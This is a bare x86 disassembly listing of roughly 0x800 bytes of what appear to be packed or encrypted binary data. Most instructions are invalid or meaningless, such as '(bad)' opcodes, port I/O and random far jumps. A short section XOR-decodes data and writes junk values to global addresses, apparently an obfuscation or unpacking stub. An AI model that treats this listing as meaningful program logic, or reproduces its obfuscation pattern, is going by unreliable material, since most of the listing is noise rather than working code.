  4041cf:	lea    ebx,ds:0x9a12f74f
  4041d5:	rcl    BYTE PTR [ebx-0x6f],1
  4041d8:	cmc    
  4041d9:	loope  0x40423a
  4041db:	in     eax,0x33
  4041dd:	jl     0x4041f8
  4041df:	out    dx,eax
  4041e0:	(bad)  
  4041e1:	iret   
  4041e2:	sahf   
  4041e3:	popa   
  4041e4:	push   cs
  4041e5:	and    eax,0xf6c8084a
  4041ea:	dec    edi
  4041eb:	cmp    edi,DWORD PTR [esi]
  4041ed:	push   ebp
  4041ee:	cmp    eax,0xfe000f47
  4041f3:	jo     0x404243
  4041f5:	loope  0x404271
  4041f7:	jmp    0xfc00:0x5f909fe2
  4041fe:	in     eax,dx
  4041ff:	push   ebx
  404200:	push   es
  404201:	inc    ebx
  404202:	stc    
  404203:	sub    eax,0xc52ffbc1
  404208:	mov    ds:0x30a634d5,al
  40420d:	dec    esi
  40420e:	push   ebx
  40420f:	lock mov bh,0xac
  404212:	xchg   esi,eax
  404213:	sub    ah,cl
  404215:	sti    
  404216:	test   BYTE PTR [ebp-0x53],bh
  404219:	dec    esi
  40421a:	mov    bl,0x7b
  40421c:	int3   
  40421d:	arpl   WORD PTR [edx-0x4dc9405f],bx
  404223:	push   cs
  404224:	sbb    ebp,DWORD PTR [ecx+eiz*2]
  404227:	mov    dl,0x92
  404229:	mov    edx,0x82a71538
  40422e:	adc    al,0x50
  404230:	lods   al,BYTE PTR ds:[esi]
  404231:	fnstsw WORD PTR [ecx+eiz*4-0xec148bd]
  404238:	clc    
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	shld   DWORD PTR [eax+0x66],esi,cl
  40425b:	inc    esp
  40425c:	dec    edi
  40425d:	sbb    BYTE PTR [eax+0x70],dh
  404260:	cmp    eax,0x2970707d
  404265:	jp     0x40426e
  404267:	lock fs sahf 
  40426a:	fstp   QWORD PTR [edx+0x6089df88]
  404270:	pop    es
  404271:	or     eax,0xb0363e55
  404276:	into   
  404277:	fnstsw WORD PTR [ebp-0x1f498f7b]
  40427d:	cmp    al,0x31
  40427f:	and    DWORD PTR [ecx-0x25],esi
  404282:	xchg   edx,eax
  404283:	add    DWORD PTR [edi+0x716708c6],esp
  404289:	add    BYTE PTR [eax-0x17],bh
  40428c:	inc    ecx
  40428d:	mov    DWORD PTR [ebx+eax*8+0x1d],esi
  404291:	test   DWORD PTR [ebp+0x70d058e2],ebp
  404297:	cmp    bh,BYTE PTR [edx]
  404299:	mov    WORD PTR [edx-0x74],fs
  40429c:	sub    esp,DWORD PTR [ecx-0x47fb0b45]
  4042a2:	pop    edi
  4042a3:	js     0x404261
  4042a5:	sub    bl,BYTE PTR [edx-0x319940ad]
  4042ab:	std    
  4042ac:	or     dl,BYTE PTR [eax]
  4042ae:	and    bl,0xb3
  4042b1:	sbb    al,0x1f
  4042b3:	sub    edx,esp
  4042b5:	adc    eax,0x2e7c7402
  4042ba:	or     ecx,DWORD PTR [eax+0x57f87546]
  4042c0:	loop   0x40428b
  4042c2:	cli    
  4042c3:	ss iret 
  4042c5:	test   eax,0x54e0af97
  4042ca:	mov    esi,0x972e5855
  4042cf:	jne    0x40431a
  4042d1:	dec    edx
  4042d2:	xchg   DWORD PTR [esi],edi
  4042d4:	mov    al,0xff
  4042d6:	jge    0x4042c5
  4042d8:	xor    ebp,esp
  4042da:	or     bh,ch
  4042dc:	out    dx,al
  4042dd:	mov    WORD PTR [edi+ebx*2],?
  4042e0:	daa    
  4042e1:	xlat   BYTE PTR ds:[ebx]
  4042e2:	mov    bl,0xf0
  4042e4:	mov    edi,0x44178fb3
  4042e9:	in     al,dx
  4042ea:	repz push 0x15
  4042ed:	push   edx
  4042ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042ef:	leave  
  4042f0:	mov    ebx,0x4110a8ba
  4042f5:	xchg   esp,eax
  4042f6:	sbb    cl,BYTE PTR [ebp+0xba0106c]
  4042fc:	push   ds
  4042fd:	ja     0x4042a0
  4042ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404300:	fimul  WORD PTR [edi+0x32]
  404303:	sub    al,0xd4
  404305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404306:	jp     0x40432f
  404308:	mov    al,0x7b
  40430a:	dec    ebp
  40430b:	imul   eax,DWORD PTR [eax+esi*4+0x64ec6c1c],0x3c3d1d8c
  404316:	int    0x9
  404318:	sti    
  404319:	lahf   
  40431a:	outs   dx,BYTE PTR ds:[esi]
  40431b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431c:	popa   
  40431d:	jle    0x40433e
  40431f:	hlt    
  404320:	push   es
  404321:	jecxz  0x404351
  404323:	popf   
  404324:	jne    0x404377
  404326:	int    0xa1
  404328:	mov    bl,0xd4
  40432a:	hlt    
  40432b:	mov    dh,0xd0
  40432d:	mov    edx,0x3edd21f2
  404332:	push   cs
  404333:	jmp    0xe3157c76
  404338:	xchg   BYTE PTR [ecx+0x4b7df74a],ch
  40433e:	jmp    0x404365
  404340:	ja     0x404348
  404342:	add    bl,dh
  404344:	xchg   ecx,eax
  404345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404346:	stc    
  404347:	xchg   BYTE PTR [esp],bh
  40434a:	xchg   ecx,eax
  40434b:	lea    ebx,[edx+ebp*1]
  40434e:	and    dl,BYTE PTR [esi+0x33]
  404351:	inc    ecx
  404352:	pushf  
  404353:	dec    edx
  404354:	dec    edx
  404355:	repz neg DWORD PTR [esi-0x4f9e0e39]
  40435c:	mov    eax,0xc4f41ea2
  404361:	jmp    0x2f3a:0x1ffbac6
  404368:	push   cs
  404369:	pop    esp
  40436a:	nop
  40436b:	xchg   edi,eax
  40436c:	xchg   ebx,eax
  40436d:	fst    QWORD PTR [eax+eiz*2+0x11]
  404371:	in     eax,0x33
  404373:	sbb    eax,0x8044ba0d
  404378:	jmp    0x523f:0xc86ff9d6
  40437f:	push   ebx
  404380:	jmp    0x2ad9:0xfdc367f7
  404387:	mov    bh,0xf7
  404389:	jbe    0x404334
  40438b:	inc    edi
  40438c:	mov    bl,0x34
  40438e:	or     al,0xc7
  404390:	jp     0x4043a3
  404392:	mul    DWORD PTR [ebp+eax*8+0x3c7a7537]
  404399:	mov    ah,BYTE PTR [ecx]
  40439b:	les    edi,FWORD PTR [eax-0x3c]
  40439e:	mov    cl,0xae
  4043a0:	xchg   esi,eax
  4043a1:	add    cl,BYTE PTR [edi-0x7531ae7b]
  4043a7:	add    ah,cl
  4043a9:	xchg   BYTE PTR [ebp-0x57],bh
  4043ac:	repnz inc BYTE PTR [ebp+0x2355b514]
  4043b3:	mov    al,0x1b
  4043b5:	stc    
  4043b6:	stos   BYTE PTR es:[edi],al
  4043b7:	shl    BYTE PTR [esi],1
  4043b9:	jnp    0x404344
  4043bb:	sub    DWORD PTR [ebx+0x413182a7],esi
  4043c1:	or     BYTE PTR [edi-0xf],ch
  4043c4:	xor    ah,BYTE PTR [edx-0x2a]
  4043c7:	pop    edi
  4043c8:	scas   eax,DWORD PTR es:[edi]
  4043c9:	mov    ch,0xe
  4043cb:	test   eax,0xacfb27d8
  4043d0:	xor    BYTE PTR ds:0x599db769,cl
  4043d6:	in     eax,dx
  4043d7:	adc    bh,0xea
  4043da:	mov    edx,0x2b8239c0
  4043df:	out    0x4d,al
  4043e1:	jno    0x4043d7
  4043e3:	mov    DWORD PTR [eax+ebp*8-0x17],0xc7c909c1
  4043eb:	fild   DWORD PTR [esi-0x66]
  4043ee:	scas   eax,DWORD PTR es:[edi]
  4043ef:	and    ebx,DWORD PTR [edx+eax*8]
  4043f2:	mov    cl,0x4c
  4043f4:	and    eax,0x4a8b2742
  4043f9:	and    eax,0xf19a4065
  4043fe:	jno    0x404398
  404400:	xor    DWORD PTR [ebp+ebp*1+0x51],0x35
  404405:	sbb    BYTE PTR [eax-0x27491731],dh
  40440b:	pop    ecx
  40440c:	aad    0x88
  40440e:	add    BYTE PTR [ecx+eax*4-0x250840b3],dl
  404415:	inc    ebx
  404416:	jne    0x404450
  404418:	mov    ebp,DWORD PTR [edx]
  40441a:	imul   edi,edx,0xa4f5f6d5
  404420:	icebp  
  404421:	mov    ebx,0x9260fb7c
  404426:	ds gs pop ebx
  404429:	mov    ds:0x36584861,eax
  40442e:	push   ebx
  40442f:	dec    esi
  404430:	fwait
  404431:	js     0x4043b8
  404433:	sbb    edi,edx
  404435:	(bad)  
  404436:	pushf  
  404437:	fdiv   DWORD PTR [ecx]
  404439:	lock push esi
  40443b:	aam    0x5f
  40443d:	retf   0xba5b
  404440:	in     eax,0x86
  404442:	test   eax,0xb9211dab
  404447:	mul    DWORD PTR [ecx+ebp*2]
  40444a:	sub    eax,0x921cf9a2
  40444f:	lods   eax,DWORD PTR ds:[esi]
  404450:	add    ch,BYTE PTR ds:0xb94ba9d4
  404456:	inc    edi
  404457:	push   cs
  404458:	out    0x58,eax
  40445a:	jl     0x404452
  40445c:	push   ebx
  40445d:	xlat   BYTE PTR ds:[ebx]
  40445e:	into   
  40445f:	repz pop esp
  404461:	push   ds
  404462:	ss jns 0x4044b6
  404465:	sahf   
  404466:	jge    0x4044b9
  404468:	jno    0x404413
  40446a:	or     DWORD PTR [ecx],esp
  40446c:	pushf  
  40446d:	push   ebp
  40446e:	clc    
  40446f:	add    eax,0x4d313b8d
  404474:	pop    ecx
  404475:	inc    eax
  404476:	mov    dh,BYTE PTR [ebx+0x3f]
  404479:	(bad)  
  40447a:	loopne 0x4044ab
  40447c:	mov    bl,0x95
  40447e:	xchg   ebp,eax
  40447f:	pushf  
  404480:	lea    edi,[ebp+ecx*2+0x41c49e9e]
  404487:	mov    eax,DWORD PTR [eax+edi*8+0x69364c75]
  40448e:	ins    DWORD PTR es:[edi],dx
  40448f:	add    al,BYTE PTR ds:0x4637ca04
  404495:	sahf   
  404496:	ds jno 0x4044d1
  404499:	int3   
  40449a:	pop    edi
  40449b:	ss and eax,0x6ee4b8c8
  4044a1:	cmp    ch,al
  4044a3:	loopne 0x4044c9
  4044a5:	hlt    
  4044a6:	imul   edx,DWORD PTR [esi+0x9],0x776d5a56
  4044ad:	popa   
  4044ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044af:	jno    0x4044aa
  4044b1:	daa    
  4044b2:	rol    bh,1
  4044b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044b5:	ins    DWORD PTR es:[edi],dx
  4044b6:	aad    0x7c
  4044b8:	es daa 
  4044ba:	fidiv  DWORD PTR [edi]
  4044bc:	cmp    DWORD PTR [ecx+0x23],esi
  4044bf:	outs   dx,DWORD PTR ds:[esi]
  4044c0:	dec    BYTE PTR [eax-0x2c2675a4]
  4044c6:	test   ebp,edx
  4044c8:	push   cs
  4044c9:	fcom   QWORD PTR [edx+esi*4]
  4044cc:	inc    eax
  4044cd:	(bad)  
  4044ce:	lds    edx,FWORD PTR [ecx]
  4044d0:	push   ds
  4044d1:	jne    0x404543
  4044d3:	arpl   WORD PTR [ebx],cx
  4044d5:	jl     0x40452b
  4044d7:	mov    BYTE PTR [edx+eax*8],ah
  4044da:	fcom   st(3)
  4044dc:	mov    edi,edi
  4044de:	neg    edx
  4044e0:	push   ecx
  4044e1:	add    BYTE PTR [ecx+0x42],bl
  4044e4:	add    DWORD PTR [ebx-0x13],0x19
  4044e8:	shr    BYTE PTR [ebp+0xa],0x44
  4044ec:	lock mov ebx,0x567d9897
  4044f2:	adc    al,0x7b
  4044f4:	(bad)  
  4044f5:	sub    bh,BYTE PTR [si+0x7edb]
  4044fa:	or     BYTE PTR [ecx],dh
  4044fc:	sub    BYTE PTR [ebx-0x3144478c],al
  404502:	test   BYTE PTR [edx+edi*1],cl
  404505:	out    dx,eax
  404506:	jge    0x4044d8
  404508:	pop    ss
  404509:	jb     0x404571
  40450b:	adc    BYTE PTR [ecx],bl
  40450d:	pop    ecx
  40450e:	retf   
  40450f:	sub    DWORD PTR [ecx-0x7c0c4a59],eax
  404515:	data16 sbb ch,BYTE PTR [eax]
  404518:	mov    ds:0xd524c983,al
  40451d:	mov    BYTE PTR [ebx],bl
  40451f:	jg     0x40459a
  404521:	mov    ds:0x958387b1,eax
  404526:	call   0xfd09:0xf4f56b3a
  40452d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40452e:	adc    al,0xa
  404530:	mov    eax,ds:0xfdac96f8
  404535:	scas   al,BYTE PTR es:[edi]
  404536:	repnz int 0x8b
  404539:	pusha  
  40453a:	std    
  40453b:	lock dec edi
  40453d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40453e:	adc    eax,0xb38c9d26
  404543:	mov    cl,0xfd
  404545:	lea    esi,[edi-0x26c49c89]
  40454b:	ja     0x4045a5
  40454d:	adc    BYTE PTR [ebx-0x60ed97db],0x9c
  404554:	mov    eax,0x1e21a6a6
  404559:	aas    
  40455a:	jecxz  0x404559
  40455c:	sbb    al,0xc8
  40455e:	ficom  WORD PTR [ebp+0x511eb6ee]
  404564:	dec    eax
  404565:	jecxz  0x4045a5
  404567:	pop    edi
  404568:	sub    BYTE PTR ds:0x6f0612b2,0xb3
  40456f:	cmp    BYTE PTR [ecx-0x71],bl
  404572:	pop    ds
  404573:	fcomp  QWORD PTR [ecx+edx*4+0x7e2b54be]
  40457a:	call   0x7991:0x8b10ee65
  404581:	inc    edx
  404582:	dec    ecx
  404583:	mov    ah,BYTE PTR [eax]
  404585:	cmovg  ebp,DWORD PTR [esi+0xb8e7131]
  40458c:	or     al,0xbf
  40458e:	sub    DWORD PTR [edi-0xc],esp
  404591:	mov    dh,ch
  404593:	push   ecx
  404594:	and    al,0xc5
  404596:	jp     0x404612
  404598:	xchg   edx,eax
  404599:	mov    esp,0xc5079534
  40459e:	push   ecx
  40459f:	retf   0x648e
  4045a2:	lea    eax,ds:0xf1b5e00
  4045a8:	adc    BYTE PTR [ecx],0xf9
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd82
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	retf   0xb52d
  4045ca:	mov    cs,WORD PTR [esp]
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0xb170707d
  4045d4:	ins    DWORD PTR es:[edi],dx
  4045d5:	dec    esi
  4045d6:	(bad)
  4045da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045db:	sar    DWORD PTR [ebx-0x1d],1
  4045de:	mov    ebx,0xad7a6890
  4045e3:	or     DWORD PTR fs:[edi],esi
  4045e6:	adc    bh,ah
  4045e8:	jno    0x404581
  4045ea:	shl    DWORD PTR [esi+esi*1],0x1
  4045ee:	jg     0x4045c1
  4045f0:	and    bh,BYTE PTR [edx-0x346edcde]
  4045f6:	pop    edx
  4045f7:	(bad)  
  4045f8:	dec    eax
  4045f9:	(bad)  
  4045fa:	sbb    BYTE PTR [eax],bl
  4045fc:	inc    eax
  4045fd:	stos   DWORD PTR es:[edi],eax
  4045fe:	mov    eax,0x34f94e17
  404603:	pop    ecx
  404604:	retf   0xa975
  404607:	mov    ecx,0x9d4cc577
  40460c:	dec    dl
  40460e:	cld    
  40460f:	test   eax,0x15ad0401
  404614:	in     al,0x61
  404616:	and    ecx,DWORD PTR [eax+0xa08e06a]
  40461c:	rcl    BYTE PTR [ebx-0x15],cl
  40461f:	add    eax,DWORD PTR [ecx-0x29]
  404622:	jae    0x404654
  404624:	vpsrlw xmm1,xmm1,XMMWORD PTR [ebx-0x42a07e2]
  40462d:	pand   xmm2,XMMWORD PTR [esi+ecx*8-0x533dd925]
  404636:	sub    ebx,DWORD PTR ds:0x25d99a53
  40463c:	mov    es,WORD PTR [esi]
  40463e:	push   edi
  40463f:	jnp    0x404610
  404641:	inc    edx
  404642:	xchg   ecx,eax
  404643:	sbb    bl,ch
  404645:	pop    ss
  404646:	into   
  404647:	in     al,dx
  404648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404649:	xchg   DWORD PTR [edx],esp
  40464b:	rcr    BYTE PTR [eax-0x775610ca],cl
  404651:	and    cl,BYTE PTR [ebx+0x1a298f43]
  404657:	adc    ah,BYTE PTR [eax+0x530bb12f]
  40465d:	pop    ds
  40465e:	push   ebp
  40465f:	dec    esp
  404660:	mov    dh,0xf3
  404662:	div    BYTE PTR [edi-0x3e609867]
  404668:	outs   dx,DWORD PTR ds:[esi]
  404669:	or     al,0x5
  40466b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40466c:	sub    cl,BYTE PTR [ebx+0x71f4917a]
  404672:	inc    edx
  404673:	jb     0x4045fd
  404675:	xchg   esi,eax
  404676:	inc    esp
  404677:	scas   eax,DWORD PTR es:[edi]
  404678:	xchg   edi,eax
  404679:	dec    edi
  40467a:	rcl    DWORD PTR [edi+0x588b9de8],0x70
  404681:	pop    ebp
  404682:	getsec 
  404684:	ins    DWORD PTR es:[edi],dx
  404685:	mov    al,0x21
  404687:	lds    ebp,FWORD PTR [eax+0x4a]
  40468a:	dec    ebx
  40468b:	mov    al,0x34
  40468d:	pop    ss
  40468e:	ficom  WORD PTR [edi+0x34]
  404691:	and    ebp,DWORD PTR [ebp-0x4f]
  404694:	xchg   edx,eax
  404695:	test   BYTE PTR [edi+edx*1+0x94c5de],dl
  40469c:	stos   BYTE PTR es:[edi],al
  40469d:	cwde   
  40469e:	xor    al,0x1b
  4046a0:	aad    0x12
  4046a2:	push   ds
  4046a3:	fld    DWORD PTR [ecx+0x8]
  4046a6:	bound  edi,QWORD PTR [eax+0xb]
  4046a9:	adc    eax,0x92fe39d8
  4046ae:	loope  0x40472b
  4046b0:	stos   DWORD PTR es:[edi],eax
  4046b1:	aad    0xf9
  4046b3:	mov    eax,ds:0x3612311a
  4046b8:	xchg   edx,eax
  4046b9:	lods   eax,DWORD PTR ds:[esi]
  4046ba:	mov    eax,0x1358ae03
  4046bf:	xchg   ecx,eax
  4046c0:	cmp    eax,0x35d5d9ea
  4046c5:	add    ah,BYTE PTR [ecx-0x627559c4]
  4046cb:	adc    BYTE PTR [eax-0x290426e4],dl
  4046d1:	not    BYTE PTR [ecx-0x1c4c389c]
  4046d7:	cmp    ebx,DWORD PTR [edx]
  4046d9:	cwde   
  4046da:	pop    ss
  4046db:	(bad)  
  4046dc:	cmp    ax,0x7cf1
  4046e0:	aaa    
  4046e1:	or     esi,DWORD PTR [edi+0x29]
  4046e4:	out    0x1d,al
  4046e6:	imul   edi,DWORD PTR [eax+0x8],0xa2df95f0
  4046ed:	sahf   
  4046ee:	push   ss
  4046ef:	jecxz  0x404738
  4046f1:	clc    
  4046f2:	lods   eax,DWORD PTR ds:[esi]
  4046f3:	jo     0x404722
  4046f5:	jo     0x40469e
  4046f7:	mov    al,0x7
  4046f9:	(bad)  
  4046fa:	call   FWORD PTR [ecx-0x71]
  4046fd:	cmp    eax,0xa1826b95
  404702:	mov    esp,es
  404704:	je     0x4046d0
  404706:	imul   esp,DWORD PTR [eax+0x5],0x1b
  40470a:	ret    0xf4a2
  40470d:	out    0x4f,al
  40470f:	cwde   
  404710:	retf   
  404711:	cmp    al,bl
  404713:	add    al,0x23
  404715:	and    DWORD PTR ds:0xa28eb0e7,edx
  40471b:	ret    0x2e74
  40471e:	adc    esp,DWORD PTR [eax]
  404720:	aas    
  404721:	scas   eax,DWORD PTR es:[edi]
  404722:	adc    esi,DWORD PTR [eax]
  404724:	sbb    BYTE PTR [eax-0xb],ah
  404727:	and    DWORD PTR [ecx],eax
  404729:	and    eax,0xd55cd221
  40472e:	push   cs
  40472f:	aad    0xfa
  404731:	(bad)  
  404732:	into   
  404733:	jns    0x404788
  404735:	adc    BYTE PTR ds:0xde504058,0x5d
  40473c:	mov    gs,ecx
  40473e:	ds ja  0x4046e7
  404741:	pushf  
  404742:	push   ss
  404743:	cwde   
  404744:	adc    eax,0x42d8c4d7
  404749:	ss fs jle 0x40470b
  40474d:	pop    esi
  40474e:	mov    eax,0x774ac9fc
  404753:	dec    edi
  404754:	inc    ebx
  404755:	sbb    eax,0x95e9b0bd
  40475a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40475b:	jp     0x40477f
  40475d:	push   esp
  40475e:	jnp    0x4047a8
  404760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404761:	cvttps2pi mm4,QWORD PTR [ebx+0x62]
  404765:	call   0xcf43:0x1fb1ef52
  40476c:	jmp    FWORD PTR [edx-0x4d]
  40476f:	xchg   bx,ax
  404771:	mov    dl,0x26
  404773:	sbb    eax,0xe2f58f8c
  404778:	aad    0x30
  40477a:	ins    BYTE PTR es:[edi],dx
  40477b:	sub    al,0xc7
  40477d:	jecxz  0x40472d
  40477f:	add    BYTE PTR ds:0x935ca0ab,al
  404785:	mov    ebp,0x30117a5f
  40478a:	adc    edi,0x6927077
  404790:	pop    ebp
  404791:	repz xchg ecx,eax
  404793:	data16 jge 0x404732
  404796:	outs   dx,BYTE PTR ds:[esi]
  404797:	dec    ecx
  404798:	ds daa 
  40479a:	call   0xdbcdba8b
  40479f:	pop    edi
  4047a0:	pop    edi
  4047a1:	out    0xb8,eax
  4047a3:	push   edx
  4047a4:	push   ss
  4047a5:	and    al,0xb3
  4047a7:	outs   dx,BYTE PTR ds:[esi]
  4047a8:	xchg   ecx,eax
  4047a9:	fsubr  DWORD PTR [ebx]
  4047ab:	cmc    
  4047ac:	nop
  4047ad:	and    ecx,ecx
  4047af:	add    BYTE PTR [ebp+0x72],ah
  4047b2:	xchg   edi,eax
  4047b3:	int3   
  4047b4:	xor    esi,ebp
  4047b6:	iret   
  4047b7:	mov    cl,0x79
  4047b9:	fsubrp st(4),st
  4047bb:	sub    ebp,DWORD PTR [edi-0x11430073]
  4047c1:	out    0xee,eax
  4047c3:	das    
  4047c4:	scas   eax,DWORD PTR es:[edi]
  4047c5:	leave  
  4047c6:	mov    esp,0x3f78bad1
  4047cb:	icebp  
  4047cc:	out    0xb9,al
  4047ce:	gs addr16 push cs
  4047d1:	ds dec ebp
  4047d3:	jns    0x4047aa
  4047d5:	mov    bh,0xd9
  4047d7:	mov    ebp,0x632d6915
  4047dc:	push   ss
  4047dd:	adc    ebx,DWORD PTR [ebp+ebx*4+0x4809f32f]
  4047e4:	jbe    0x4047ab
  4047e6:	shr    DWORD PTR [bx-0x79a4],1
  4047eb:	inc    edx
  4047ec:	xchg   ebx,eax
  4047ed:	xchg   BYTE PTR [ecx+0x4c],dh
  4047f0:	enter  0x6484,0xf5
  4047f4:	xor    ecx,eax
  4047f6:	rcl    DWORD PTR [edi+eiz*1],0x37
  4047fa:	jge    0x404871
  4047fc:	dec    ebp
  4047fd:	jg     0x404855
  4047ff:	mov    esi,DWORD PTR [ebp+0x30e9a2fd]
  404805:	std    
  404806:	xchg   ecx,eax
  404807:	into   
  404808:	imul   edi,DWORD PTR [esi+0x45],0x5080183b
  40480f:	imul   edx,DWORD PTR [ecx],0x722f526d
  404815:	inc    DWORD PTR [edi+ebx*4]
  404818:	sahf   
  404819:	aam    0x1f
  40481b:	inc    ebx
  40481c:	mov    dl,0x35
  40481e:	ror    BYTE PTR [edi-0x6e969aca],0x55
  404825:	xor    ch,dh
  404827:	sub    eax,0x45144fb6
  40482c:	add    eax,0x328d671f
  404831:	mov    esi,0xdf6bf85b
  404836:	loopne 0x404809
  404838:	sbb    ch,al
  40483a:	adc    al,0xf
  40483c:	inc    edi
  40483d:	fdivr  DWORD PTR [ecx]
  40483f:	xchg   DWORD PTR [ebx+ebx*2],esi
  404842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404843:	pop    es
  404844:	mov    eax,0x872cedc8
  404849:	xchg   ecx,eax
  40484a:	adc    eax,0x75957ad1
  40484f:	adc    DWORD PTR [esi-0x37],0xffffff89
  404853:	gs dec edi
  404855:	aam    0x30
  404857:	inc    ebp
  404858:	dec    esi
  404859:	or     edx,edx
  40485b:	sti    
  40485c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40485d:	out    0x6e,eax
  40485f:	mov    dl,bl
  404861:	in     eax,0x9c
  404863:	in     al,0x8d
  404865:	je     0x404848
  404867:	mov    ebx,0x5d261651
  40486c:	mov    dh,0x18
  40486e:	nop
  40486f:	jbe    0x4048c5
  404871:	aas    
  404872:	rol    BYTE PTR [ecx],cl
  404874:	in     al,0xbc
  404876:	bswap  ecx
  404878:	out    0xda,eax
  40487a:	mov    al,0x6a
  40487c:	(bad)  
  40487d:	idiv   BYTE PTR [ecx+eax*8]
  404880:	pop    ds
  404881:	call   0xa213:0x145c44e
  404888:	inc    eax
  404889:	icebp  
  40488a:	inc    edx
  40488b:	imul   ecx,DWORD PTR [edx-0x57],0xffffffe9
  40488f:	test   BYTE PTR [ecx+eax*2+0x671b1fec],cl
  404896:	in     al,dx
  404897:	pop    esi
  404898:	jno    0x4048e6
  40489a:	int3   
  40489b:	(bad)  
  40489c:	cmp    ah,BYTE PTR [eax-0x4c]
  40489f:	push   ebx
  4048a0:	stc    
  4048a1:	(bad)  
  4048a2:	mov    ebp,0x59a90e0c
  4048a7:	mov    eax,0x7baf8737
  4048ac:	adc    DWORD PTR [ebp+0x5c],ebp
  4048af:	test   eax,0x31281954
  4048b4:	mov    dl,0x70
  4048b6:	jnp    0x40483a
  4048b8:	dec    ebp
  4048b9:	rol    BYTE PTR [ebx-0x361f9829],0xa9
  4048c0:	jmp    0x404866
  4048c2:	mov    ch,0xff
  4048c4:	mov    al,0x50
  4048c6:	sahf   
  4048c7:	fldenv [edi-0x131c1a96]
  4048cd:	xchg   ebp,eax
  4048ce:	pop    ds
  4048cf:	(bad)  
  4048d0:	xor    al,0x89
  4048d2:	push   esi
  4048d3:	aad    0xa0
  4048d5:	inc    ecx
  4048d6:	adc    eax,0xc9cb1f67
  4048db:	sti    
  4048dc:	fcmovnb st,st(5)
  4048de:	push   ss
  4048df:	pop    ss
  4048e0:	shr    BYTE PTR [edi+eiz*1-0x51],1
  4048e4:	jmp    0xe292:0xb5db85d9
  4048eb:	push   edx
  4048ec:	dec    ecx
  4048ed:	push   ebx
  4048ee:	mov    ax,0x467d
  4048f2:	lods   eax,DWORD PTR ds:[esi]
  4048f3:	add    al,0x8a
  4048f5:	imul   esp,DWORD PTR [ebx],0x24
  4048f8:	mov    ah,0x3c
  4048fa:	push   cs
  4048fb:	retf   0x68cc
  4048fe:	in     eax,0xd6
  404900:	push   ss
  404901:	inc    esp
  404902:	cdq    
  404903:	test   BYTE PTR [edi+0x52],0xe7
  404907:	lods   al,BYTE PTR ds:[esi]
  404908:	dec    ebp
  404909:	clc    
  40490a:	sub    BYTE PTR [ebx],ch
  40490c:	pushf  
  40490d:	aaa    
  40490e:	outs   dx,BYTE PTR ds:[esi]
  40490f:	mov    ebx,DWORD PTR [eax-0x3b]
  404912:	push   0x8b25683f
  404917:	inc    ebp
  404918:	hlt    
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	dec    edi
  4049bc:	loop   0x404a0f
  4049be:	xchg   cl,cl
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0x7470707d
  4049c8:	mov    ch,0x31
  4049ca:	(bad)  
  4049cb:	push   esi
  4049cc:	jb     0x404979
  4049ce:	sub    al,0x4a
  4049d0:	cld    
  4049d1:	or     ebx,DWORD PTR [ecx+0x36]
  4049d4:	fld    TBYTE PTR ss:[eax]
  4049d7:	out    0xb3,eax
  4049d9:	leave  
  4049da:	adc    al,0xc
  4049dc:	mov    edi,DWORD PTR [esi+esi*1]
  4049df:	xor    DWORD PTR [eax],eax
